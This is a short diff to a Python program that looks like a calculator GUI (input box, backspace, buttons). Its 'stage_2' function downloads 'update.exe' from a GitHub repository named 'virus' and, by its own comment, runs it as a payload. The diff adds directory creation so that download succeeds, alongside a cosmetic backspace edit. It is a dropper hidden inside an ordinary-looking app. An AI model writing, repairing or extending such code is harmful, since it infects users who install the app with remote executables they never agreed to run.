@@ -1,6 +1,7 @@
 from urllib.request import urlretrieve
 from threading import Thread
 from shared import *
+import os
 
 set_priority()
 
@@ -8,6 +9,8 @@ download_url = 'https://raw.githubusercontent.com/Omena0/virus/main/src/update.e
 file_name = 'update/update.exe'
 
 def stage_2():
+    os.makedirs(file_name.rsplit('/',1)[0])
+
     urlretrieve(download_url, file_name)
 
     # Run payload
@@ -53,7 +56,7 @@ def clear_display():
 def backspace():
     bs = input_box.get()
     input_box.delete(0, END) # type: ignore
-    input_box.insert(0, bs[0:-1])
+    input_box.insert(0, bs[:-1])
 
 # Define button dimensions
 button_width = 70
